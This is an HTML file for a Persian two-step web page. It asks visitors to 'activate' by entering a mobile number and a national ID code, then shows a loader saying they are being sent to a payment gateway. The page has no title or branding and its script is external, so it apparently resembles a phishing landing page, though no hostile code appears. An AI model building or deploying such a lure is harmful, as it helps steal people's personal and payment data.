<!DOCTYPE html>
<html lang="fa" dir="rtl">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
    <link rel="shortcut icon" href="" type="image/x-icon" />
    <link rel="stylesheet" href="./src/styles/output.css" />
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css"
    />
  </head>
  <body>
    <!-- page 1 -->
    <div
      id="page1"
      class="bg-black/90 flex items-center flex-col justify-center h-[100dvh]"
    >
      <h1 class="text-white">
        برای فعال سازی اطلاعات خواسته شده را وارد نمایید.
      </h1>
      <div class="mt-5 flex gap-1 flex-col">
        <input
          class="p-1.5 w-[15rem] rounded-lg outline-none text-black"
          type="number"
          placeholder="شماره موبایل"
          id="phoneInput"
        />
        <span id="phoneValid" class="text-sm hidden text-red-600"
          >شماره موبایل وارد شده صحیح نیست.</span
        >
      </div>
      <div class="mt-5 flex gap-1 flex-col">
        <input
          class="p-1.5 w-[15rem] rounded-lg outline-none text-black"
          type="number"
          placeholder="کد ملی"
          id="codemeliInput"
        />
        <span id="codeValid" class="text-sm hidden text-red-600"
          >کدملی وارد شده صحیح نیست.</span
        >
      </div>
      <button
        id="firstBtn"
        class="p-2 rounded-lg bg-indigo-700 text-white w-[15rem] mt-8 hover:bg-indigo-950 border border-[rgba(255,255,255,0.3)] transition-all duration-300"
      >
        ادامه
      </button>
    </div>
    <!-- end page 1 -->
    <!-- page 2 -->
    <div
      id="page2"
      class="bg-black/90 p-3 flex hidden items-center flex-col justify-center h-[100dvh]"
    >
      <!-- <h1 class="text-2xl text-white">تکمیل اطلاعات</h1> -->
      <!-- <div class="flex flex-col gap-2 w-full !max-w-[20rem] mt-10">
        <span class="text-sm text-white">ایمیل خود را وارد کنید :</span>
        <input
          class="p-1.5 w-full rounded-md outline-none text-black"
          type="email"
          placeholder="exmaple@gmail.com"
          id="emailInput"
        />
      </div> -->

      <div class="relative">
        <h1 class="mt-24 text-sm text-white">
          لطفا صبر کنید درحال انتقال به درگاه ...
        </h1>
        <div
          class="loader1 absolute top-[50%] translate-y-[-50%] left-[50%] translate-x-[-50%]"
        >
          <div class="loader1Div">
            <div></div>
            <div><div></div></div>
          </div>
        </div>
        <div
          class="loader2 absolute top-[50%] translate-y-[-50%] left-[50%] translate-x-[-50%]"
        >
          <div class="loader2Div">
            <div></div>
            <div><div></div></div>
          </div>
        </div>
      </div>
    </div>
    <!-- end page 2 -->
    <script src="./src/js/index.js"></script>
    <script
      type="text/javascript"
      src="https://cdn.jsdelivr.net/npm/toastify-js"
    ></script>
  </body>
</html>
